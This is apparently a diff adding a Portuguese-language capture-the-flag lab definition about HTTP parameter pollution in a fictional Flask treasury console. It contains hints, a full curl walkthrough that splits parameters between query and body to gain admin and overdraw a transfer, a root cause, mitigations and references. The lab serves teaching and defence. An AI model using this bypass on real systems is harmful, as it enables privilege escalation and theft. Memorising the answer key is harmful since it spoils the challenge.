@@ -1,0 +1,82 @@
+{
+  "slug": "access-http-parameter-pollution",
+  "title": "Divida a duplicata",
+  "codename": "CLEARING",
+  "summary": "O console de tesouraria da Clearing Corp executa um guard de compliance que rejeita parâmetros duplicados na URL e parâmetros duplicados no body, mas nunca um nome que aparece nos dois. A lógica de negócio mescla as duas fontes e usa o último valor, então o guard aprova um papel (role) enquanto o perfil é gravado com outro.",
+  "category": "access",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "access-http-parameter-pollution",
+  "estimated_minutes": 18,
+  "xp": 120,
+  "tech": [
+    "Flask",
+    "Werkzeug",
+    "HTTP",
+    "WAF"
+  ],
+  "tags": [
+    "http-parameter-pollution",
+    "waf-bypass",
+    "privilege-escalation",
+    "request-parsing"
+  ],
+  "story": "O console de operações de tesouraria da Clearing Corp movimenta fundos de liquidação e permite que a equipe solicite mudanças de papel. Um guard de compliance fica na frente de `/transfer`, interpreta a request como um WAF típico e rejeita qualquer nome que apareça duas vezes. O endpoint em si mescla dados de query e de form em um único conjunto e usa a última ocorrência. Quando as duas camadas discordam sobre qual ocorrência é a real, o guard aprova uma request que a lógica de negócio nunca vê.",
+  "objective": "Use HTTP parameter pollution para fazer o guard de compliance aprovar uma request que promove a conta de tesouraria a admin, depois leia a flag das ferramentas de admin.",
+  "rules": "Fique na origem loopback designada. Não faça brute-force de credenciais. O guard faz parte do lab; mantenha-o em execução.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo das ferramentas de admin",
+      "flag_type": "user",
+      "points": 120,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Dois parsers, uma request",
+      "body": "Envie `role=treasury&role=admin` na URL de `POST /role`. O guard vê uma duplicata e bloqueia. Note que a URL e o body do form são interpretados por caminhos de código diferentes, e o endpoint os junta.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Divida entre as fontes",
+      "body": "Envie `role` uma vez na query string (`?role=treasury`) e uma vez no body do form (`role=admin`). Nenhuma fonte repete o nome, então o guard fica quieto; o endpoint mescla a query primeiro e o body por último, e usa o último valor.",
+      "cost": 15
+    },
+    {
+      "level": 3,
+      "title": "O mesmo truque move dinheiro",
+      "body": "O endpoint de transfer usa `amount`, `from` e `to` da mesma forma. Coloque na query string os valores que o guard deve aprovar e no body os valores reais. O guard compara o amount que ele validou com o saldo antes do débito; a lógica de negócio debita o último amount da junção.",
+      "cost": 15
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Entre como o usuário de tesouraria:\n\n```bash\ncurl -c jar.txt -d 'username=devon&password=devon-treasury-2026' http://127.0.0.1:PORT/login\n```\n\n2. Confirme que duplicatas dentro de uma mesma fonte são bloqueadas:\n\n```bash\ncurl -b jar.txt -d 'role=treasury' 'http://127.0.0.1:PORT/role?role=treasury&role=admin'\n# Blocked by compliance guard: duplicate parameter rejected\n```\n\n3. Divida a duplicata entre query e body:\n\n```bash\ncurl -b jar.txt -d 'role=admin' 'http://127.0.0.1:PORT/role?role=treasury'\n# Role updated: role is now admin\n```\n\n4. Recarregue o console. O painel de ferramentas de admin mostra a flag:\n\n```bash\ncurl -b jar.txt http://127.0.0.1:PORT/console\n```\n\nA mesma primitiva funciona no caminho do dinheiro: `curl -b jar.txt -d 'from=checking-4401&to=finance-admin&amount=900.00' 'http://127.0.0.1:PORT/transfer?amount=100.00&from=checking-4401'` passa pela verificação de amount do guard com 100.00 enquanto debita 900.00 do saldo da tesouraria.",
+    "root_cause": "HTTP parameter pollution causada por parsing inconsistente. O guard canonicaliza e conta parâmetros por fonte (query string, body do form), então um nome que aparece uma vez em cada é considerado único. O endpoint mescla as duas fontes em um único dicionário e usa a última ocorrência, então o valor validado pelo guard não é o valor aplicado. As duas camadas discordam tanto na aridade quanto na precedência de parâmetros duplicados.",
+    "mitigation": "Faça o parsing de cada request uma única vez, em um único componente, e passe o value object imutável resultante tanto para a verificação de policy quanto para a lógica de negócio. Rejeite requests em que um parâmetro esteja presente em mais de um local, defina uma única regra de precedência e aplique-a em todo lugar, ou use um modelo de request tipado (body JSON com validação de schema) para que duplicatas não possam existir. Baseie a autorização em estado do servidor, não em parâmetros da request, e adicione testes que reproduzam a request pelo mesmo parser que o endpoint usa."
+  },
+  "references": [
+    {
+      "title": "OWASP WSTG — Testing for HTTP Parameter Pollution (WSTG-INPV-04)",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution",
+      "source_type": "standard",
+      "description": "Como diferentes stacks tratam parâmetros repetidos e por que os servidores divergem."
+    },
+    {
+      "title": "PortSwigger — HTTP Parameter Pollution",
+      "url": "https://portswigger.net/kb/issues/00900210_http-parameter-pollution",
+      "source_type": "official",
+      "description": "Descrição da issue cobrindo abuso de precedência de parâmetros no servidor."
+    },
+    {
+      "title": "CWE-235 — Improper Handling of Extra Parameters",
+      "url": "https://cwe.mitre.org/data/definitions/235.html",
+      "source_type": "standard",
+      "description": "Classe de fraqueza para componentes que aplicam conjuntos de parâmetros diferentes dos que validaram."
+    }
+  ]
+}
